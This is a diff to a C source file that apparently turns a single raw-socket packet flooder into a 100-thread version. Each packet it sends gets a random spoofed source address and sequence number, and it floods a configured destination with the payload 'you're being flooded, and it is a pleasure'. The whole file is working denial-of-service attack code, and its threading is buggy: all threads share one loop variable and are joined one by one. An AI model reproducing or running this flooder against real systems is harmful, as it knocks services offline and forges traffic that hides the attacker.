@@ -11,33 +11,41 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <pthread.h>
 
 #include <errno.h>
 
 #include "header.h"
 
+#define NB_SOCKETS 100
+
 #define DEST_IP "192.168.56.101" //set your destination ip here
 #define DEST_PORT 2000 //set the destination port here
 #define TEST_STRING "you're being flooded, and it is a pleasure" //a teststring as packet payload, min 8 bits
 
-char packet[65536];
+char packets[NB_SOCKETS][65536];
 int const size_iph = sizeof(struct iphdr), size_tcph = sizeof(struct tcphdr), size_pseudo =  sizeof(struct pseudo_udp_header);
 
-int generate_packet(){
+
+struct sockaddr_in dest;
+int fds[NB_SOCKETS];
+int tot_size;
+
+int generate_packet(int i){
 	char dest_ip[] = DEST_IP;
 
 	char data_string[] = TEST_STRING;
-	memset(packet, 0, 65536);
+	memset(packets[i], 0, 65536);
 
 	//IP header pointer
-	struct iphdr *iph = (struct iphdr *)packet;
+	struct iphdr *iph = (struct iphdr *)packets[i];
 
 	//UDP header pointer
-	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+	struct tcphdr *tcph = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));
 	struct pseudo_udp_header ptcph;
 
 	//data section pointer
-	char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+	char *data = packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 	//fill the data section
 	strncpy(data, data_string, strlen(data_string));
@@ -92,10 +100,10 @@ int generate_packet(){
 	return tot_size;
 }
 
-void modify_packet(){
-	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
-	struct iphdr *iph = (struct iphdr *)packet;
-	char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+void modify_packet(int i){
+	struct tcphdr *tcph = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));
+	struct iphdr *iph = (struct iphdr *)packets[i];
+	char *data = packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 	iph->saddr = rand();
 	tcph->seq = htonl(rand()%4294967296);
@@ -126,36 +134,57 @@ void modify_packet(){
 	free(check_calc);
 }
 
+void *send_packet(void *i){
+	while(1){
+		if(sendto(fds[*(int *)i], packets[*(int *)i], tot_size, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0)
+			printf("Error : %s\n", strerror(errno));
+		modify_packet(*(int *)i);
+	}
+}
+
 int main(int argc, char *argv[]){
 
 	srand(time(NULL));
 	
-	int tot_size = generate_packet();
+	
 
-	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	pthread_t threads[NB_SOCKETS];
 
     int hincl = 1;                  /* 1 = on, 0 = off */
-    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
 
-	if(fd < 0){
-		perror("Error creating raw socket ");
-		exit(1);
+	for(int i = 0; i<NB_SOCKETS; i++){
+		tot_size = generate_packet(i);
+
+		fds[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+		setsockopt(fds[i], IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
+
+		if(fds[i] < 0){
+			perror("Error creating raw socket ");
+			exit(1);
+		}
+
 	}
+	
 	
 
 	//send the packet
-	struct sockaddr_in dest;
 	dest.sin_family = AF_INET;
 	dest.sin_port = htons(DEST_PORT);
 	dest.sin_addr.s_addr = inet_addr(DEST_IP);
 
-	while(1){
-		if(sendto(fd, packet, tot_size, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0)
-			printf("Error : %s\n", strerror(errno));
-		modify_packet();
+	for(int i = 0; i<NB_SOCKETS; i++){
+		if(pthread_create(&threads[i], NULL, send_packet, &i)){
+			printf("Error creating thread\n");
+			return 1;
+		}
+
+		pthread_join(threads[i], NULL);
+		
 	}
 
-	close(fd);
+	for(int i = 0; i<NB_SOCKETS; i++){
+		close(fds[i]);
+	}
 
 	return 0;
 }
